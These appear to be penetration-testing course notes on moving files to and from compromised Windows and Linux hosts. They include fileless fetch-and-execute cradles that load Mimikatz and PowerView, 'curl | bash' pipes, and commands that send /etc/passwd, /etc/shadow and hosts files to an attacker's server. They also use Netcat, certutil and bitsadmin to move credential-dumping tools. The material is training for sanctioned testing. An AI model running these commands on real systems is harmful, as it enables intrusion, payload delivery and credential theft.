# File Transfer Methods

Example of APT being used: [Microsoft Astaroth Attack](https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)

The blog post starts out talking about [fileless threats](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/). The term `fileless` suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack

The `Astaroth attack` generally followed these steps:&#x20;

1. A malicious link in a spear-phishing email led to an LNK file.&#x20;
2. When double-clicked, the LNK file caused the execution of the [WMIC tool](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code.&#x20;
3. The JavaScript code, in turn, downloads payloads by abusing the [Bitsadmin tool](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).

<figure><img src="https://academy.hackthebox.com/storage/modules/24/fig1a-astaroth-attack-chain.png" alt=""><figcaption></figcaption></figure>

## Windows File Transfer Methods

### Download Operations

#### Powershell Baes64 Encode & Decode

If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content

An essential step in using this method is to ensure the file you encode and decode is correct. We can use [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html)

```bash
md5sum <file>
// 4e301756a07ded0a2dd6953abf015278  id_rsa
cat <file> |base64 -w 0;echo
// LS0tLS1CRUdJTiBPUEVOU1N..
```

We can paste this into a PowerShell to decode it

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1N.."))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
// Algorithm       Hash                                                                   Path
// ---------       ----                                                                   ----
// MD5             4E301756A07DED0A2DD6953ABF015278    
```

#### Powershell Web Downloads

PowerShell offers many file transfer options. In any version of PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |

File download example using Net.WebClient and DownloadFile"

```powershell
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

PowerShell DownloadString - Fileless Method:

```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

PowerShell 3.0+ includes Invoke-Web-Request:

```powershell
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

#### Common Errors

If IE first launch hasn't happened, use the -UseBasicParsing param:

```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

If certificate is not trusted in a SSL/TLS secure channel:

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
// Error thrown
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

#### SMB Downloads

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
copy \\192.168.220.133\share\nc.exe
```

If newer Windows blocks unauth'd access, we can set a username and password and mount the server onto our windows target machine:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

#### FTP Downloads

We can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. It can be installed with the following command:

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

To transfer from FTP using PowerShell:

<pre class="language-bash"><code class="lang-bash"><strong> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
</strong></code></pre>

If we get a shell but it is not interactive, we can create an FTP command file to download a file:

```bash
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

ftp> open 192.168.49.128 // In FTP server
ftp> GET file.txt

more file.txt
```

### Upload Operations

#### PowerShell Base64 Encode & Decode

This is a reverse of the previous Base64 section, where we encode a file so we can decode it on our host

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

To decode in Linux:

```bash
echo <string> | base64 -d > hosts
md5sum hosts
```

#### PowerShell Web Uploads

PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function

For our web server, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python [HTTP.server module](https://docs.python.org/3/library/http.server.html), which includes a file upload page

```bash
pip3 install uploadserver
python3 -m uploadserver
```

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

#### PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat.&#x20;

We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string

```bash
nc -lvnp 8000
Ctrl + C
echo <string> | base64 -d -w 0 > hosts
```

#### SMB Uploads

Most companies don't let SMB protocol out of their internal network. An alternative is to run SMB over HTTP or HTTPS with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver

#### Using WebDav

We need to install two Python modules, `wsgidav` and `cheroot` and use the `wsgidav` app in the target directory

```bash
sudo pip3 install wsgidav cheroot

sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

# Inside the directory:
dir \\192.168.49.128\DavWWWRoot
# DavWWWRoot is a special keyword recognized by the Windows Shell. 
# No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the 
# Mini-Redirector driver, which handles WebDAV requests that you are connecting to the 
# root of the WebDAV server
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\

# Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the 
# same way we set it up for download operations.
```

#### FTP Uploads

We can use PowerShell or a FTP client. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

Then use the PowerShell upload function

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

Creating a command file for a FTP client to upload:

```bash
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

## Linux File Transfer Methods

### Download Operations

#### Base64 Encoding/Decoding

```bash
# Encode and copy
md5sum id_rsa
cat id_rsa | base64 -w 0; echo

# Paste and decode on target
echo -n "<hash>" | base64 -d > id_rsa
```

#### Web Downloads with Wget and cURL

```bash
# Download with wget
wget <file> -O <outputFile>
# Download with cURL
curl -o <outputFile> <file>
```

### Fileless Attacks Using Linux

Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations

Note: Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS

```bash
# Fileless download with cURL
curl <URL> | bash

# Fileless download with wget
wget -qO- <URL> | python3 # (or any executor bash, npm, etc)
```

### Download with Bash (/dev/tcp)

As long as Bash 2.04+ is installed, the /dev/ TCP device file can be used

```bash
# Connect to target webserver
exec 3<>/dev/tcp/<ip>/80
# HTTP GET request
echo -e "GET /<file> HTTP/1.1\n\n">&3
# Print the response
cat <&3
```

### SSH Downloads

SCP (secure copy) is similar to copy or cp but we have to specify username, IP or DNS name, and credentials

```bash
# Enable SSH server
sudo systemctl enable ssh
sudo systemctl start ssh

# Check for SSH Listening Port
netstat -lnpt

# Download file using SCP
scp plaintext@<ip>:/root/root.txt .
```

Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer

### Upload Operations

#### Web Upload

As in Windows, we can use uploadserver instead of HTTP.server

```bash
# Install uploadserver
sudo python3 -m pip install --user uploadserver
# Create a self-signer cert
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

# Start web server
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# From compromised machine:
curl -X POST https://<MyMachineIP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Alternative Web File Transfer Method

Linux distros usually have python or PHP installed so starting a web server is easy

```bash
# Using Python3
python3 -m http.server
# Using Python2.7
python2.7 -m SimpleHTTPServer
# Using PHP
php -S 0.0.0.0:8000
# Using Ruby
ruby -run -ehttpd . -p8000

# Download file from target into my machine
wget <TargetIP>:<port>/file.txt
```

### SCP Upload

```bash
scp /etc/passwd <TargetUser>@<IP>:/home/<TargetUser>/
```

## Transferring Files with Code

We can use some Windows default applications, such as `cscript` and `mshta`, to execute JavaScript or VBScript code. JavaScript can also run on Linux hosts

### Python

Python one-liner download scripts:

```bash
# Python 2.7
python2.7 -c 'import urllib;urllib.urlretrieve ("https://file.sh", "file.sh")'
# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://file.sh", "file.sh")'
```

### PHP

PHP is used by 77.4% of all websites with known server-side

**PHP Download with File\_get\_contents()**

```bash
php -r '$file = file_get_contents("https://file.sh"); file_put_contents("file.sh",$file);'
```

**PHP Download with Fopen()**

```bash
php -r 'const BUFFER = 1024; $fremote = fopen("https://file.sh", "rb"); $flocal = fopen("file.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

**PHP Download file and Pipe it to Bash**

```bash
php -r '$lines = @file("https://file.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

Note: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled

### Other Languages

**Ruby - Download a File**

```bash
ruby -e 'require "net/http"; File.write("file.sh", Net::HTTP.get(URI.parse("https://file.sh")))'
```

**Perl - Download a File**

```bash
perl -e 'use LWP::Simple; getstore("https://file.sh", "file.sh");'
```

### Javascript

We can create a file called wget.js with this inside:

```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

We then execute the following from Windows command prompt or PowerShell to execute and download:

```bash
cscript.exe /nologo wget.js https://file.ps1 file.ps1
```

### VBScript

We'll create a file called `wget.vbs` and save the following content:

```vb
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Then run this from Windows command prompt or PowerShell to execute and download:

```bash
cscript.exe /nologo wget.vbs https://file.ps1 file.ps1
```

### Upload using Python3

Start an upload server:

```bash
python3 -m uploadserver
```

Run this command to send a file:

```bash
python3 -c 'import requests;requests.post("http://<ip>:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## Miscellaneous File Transfer Methods

### Netcat

[Netcat](https://sectools.org/tool/netcat/) (often abbreviated to `nc`) is a computer networking utility for reading from and writing to network connections using TCP or UDP

The flexibility and usefulness of this tool prompted the Nmap Project to produce [Ncat](https://nmap.org/ncat/), a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more

Note: Ncat is used in HackTheBox's PwnBox as nc, ncat, and netcat.

### File Transfer with Netcat and Ncat

n this example, we'll transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine

We'll first start Netcat (`nc`) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\)) using a single greater-than `>` followed by the filename, `SharpKatz.exe`

**Compromised Machine - Listening on Port 8000**

```bash
# Example using Original Netcat
nc -l -p 8000 > SharpKatz.exe
# Example using Ncat (specify --recv-only to close connection
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

From our host, connect and send the file SharpKatx.exe as input. `-q 0` will tell Netcat to close the connection once it finishes

```bash
wget -q https://<Malicious File Download URL>/SharpKatz.exe
# Example using Original Netcat
cn -q 0 <ip> 8000 < SharpKatz.exe
# Example Using Ncat
ncat --send-only <ip> 8000 < SharpKatz.exe
```

Instead of listening on the target, we can connect from our host to transfer. This is useful when there's a firewall blocking inbound connections:

**Attack Host - Sent file as input**

```bash
# Example using Original Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe
# Example using Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Compromised Machine - Connect to Receive File**

```bash
# Example using Original Netcat
nc <ip> 443 > SharpKatz.exe
# Example using Ncat
ncat <ip> 443 --recv-only > SharpKatz.exe
```

If we can't have Netcat or Ncat on the compromised machine, Bash supports read/write operations on /dev/TCP/

**Sending File as Input**

```bash
# Example using Original Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe
# Example using Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Compromised Machine - Connect with /dev/tcp to Receive the File**

```bash
cat < /dev/tcp/<ip>/443 > SharpKatz.exe
```

### PowerShell Session File Transfer

If HTTP, HTTPS, and SMB are all unavailable, we can use PowerShell Remoting (aka WinRM) to perform file transfer operations

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration



This example transfers a file from DC01 to DATABASE01 and vice versa. We have an Administrator session in DC01, administrative rights on DATABASE01, and PowerShell Remoting is enabled

**From DC01 - Confirm WinRM 5985 is open on DATABASE01**

```powershell
PS C:\htb> whoami
htb\administrator
PS C:\htb> hostname
DC01
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

**Create a PowerShell Remoting Session to DATABASE01**

```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

**Copy samplefile.txt from Localhost to DATABASE01 Session**

```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

**Copy DATABASE.txt from DATABASE01 to our Localhost**

```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP

If connected from Linux, we can use xfreerdp or rdesktop

As an alternative to copy/paste, we can mount a local resource on the target RDP server

**Mount Linux Folder**

```bash
# Using rdesktop
rdesktop <ip> -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
# Using xfreerdp
xfreerdp /v:<ip> /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access, we can connect to `\\tsclient\` on the RDP'd windows device to transfer files back and forth

<figure><img src="https://academy.hackthebox.com/storage/modules/24/tsclient.jpg" alt=""><figcaption></figcaption></figure>

## Protected File Transfers

We need to make sure sensitive data we gain access to during a pentest is properly encrypted. If SSH, SFTP, or HTTPS is not available to us then we need a different approach

Note: Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (i.e., credit card numbers), trade secrets, etc., from a client environment. Instead, if attempting to test Data Loss Prevention (DLP) controls/egress filtering protections, create a file with dummy data that mimics the data that the client is trying to protect

Therefore, encrypting the data or files before a transfer is often necessary to prevent the data from being read if intercepted in transit

Data leakage during a penetration test could have severe consequences for the penetration tester, their company

### File Encryption on Windows

Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) PowerShell script

**Import Module Invoke-AESEncryption.ps1**

```powershell
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
```

After being imported, it can encrypt strings or files. This example creates an encrypted file with same name but the extension ".aes"

```powershell
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
File encrypted to C:\htb\scan-results.txt.aes
```

Using very `strong` and `unique` passwords for encryption for every company where a penetration test is performed is essential. This is to prevent sensitive files and information from being decrypted using one single password that may have been leaked and cracked by a third party

### File Encryption on Linux

[OpenSSL](https://www.openssl.org/) is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style" to encrypt files

To encrypt a file using `openssl` we can select different ciphers, see [OpenSSL man page](https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html). Let's use `-aes256` as an example. We can also override the default iterations counts with the option `-iter 100000` and add the option `-pbkdf2` to use the Password-Based Key Derivation Function 2 algorithm

**Encrypting /etc/passwd with openssl**

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

**Decrypt passwd.enc with openssl**

```bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    
```

## Catching Files over HTTP/S

### Nginx - Enabling PUT

A good alternative for transferring files to `Apache` is [Nginx](https://www.nginx.com/resources/wiki/) because the configuration is less complicated, and the module system does not lead to security issues as `Apache` can

```bash
# Create directory to handle uploaded files
sudo mkdir -p /var/www/uploads/SecretDirectory
# Change the owner to www-data
sudo chown -R www-data:www-data /var/www/uploads/SecretDirectory
```

Create the Nginx config file at `/etc/nginx/sites-available/upload.conf`

```nginx
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

**Symlink our Site to the sites-enabled Directory**

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

**Start Nginx**

```bash
sudo systemctl restart nginx.service
```

To check for any errors, we can look at /var/log/nginx/error.log

```bash
tail -2 /var/log/nginx/error.log

2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()

ss -lnpt | grep 80

LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))

ps -ef | grep 2811

user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
```

We see there is a service on port 80 already. We can remove the default Nginx config that binds to port 80

```bash
sudo rm /etc/nginx/sites-enabled/default
```

Now we can use cURL to send a PUT request for testing uploads

<pre class="language-shellscript"><code class="lang-shellscript">curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
<strong>sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
</strong>
user65:x:1000:1000:,,,:/home/user65:/bin/bash
</code></pre>

Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to `http://localhost/SecretUploadDirectory`. By default, with `Apache`, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them

## Living Off the Land

The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:

* [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)
* [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Living off the Land binaries can be used to perform functions such as:

* Download
* Upload
* Command Execution
* File Read
* File Write
* Bypasses

### Using the LOLBAS and GTFOBins Project

To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/24/lolbas_upload.jpg" alt=""><figcaption></figcaption></figure>

We need to listen on a port for incoming traffic with Netcat and execute certreq.exe to upload a file

```shellscript
# This sends the file to our Netcat and we can copy/paste
C:\htb> certreq.exe -Post -config http://<ip>:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)

# To run netcat and get the file
sudo nc -lvnp 8000
```

To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`

<figure><img src="https://academy.hackthebox.com/storage/modules/24/gtfobins_download.jpg" alt=""><figcaption></figcaption></figure>

Let's use OpenSSL. We need to create a cert and start a server host-side

```shellscript
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
# Example leaves all fields empty

# Stand up a server
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# Download file from target machine
openssl s_client -connect <ip>:80 -quiet > LinEnum.sh
```

### Other Common Living Off The Land Tools

The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work

```powershell
# File download with Bitsadmin
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://<ip>:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe

# PowerShell also allows BITS interaction
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://<ip>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

#### CertItools

It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto `wget` for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage

```shellscript
C:\htb> certutil.exe -verifyctl -split -f http://<ip>:8000/nc.exe
```
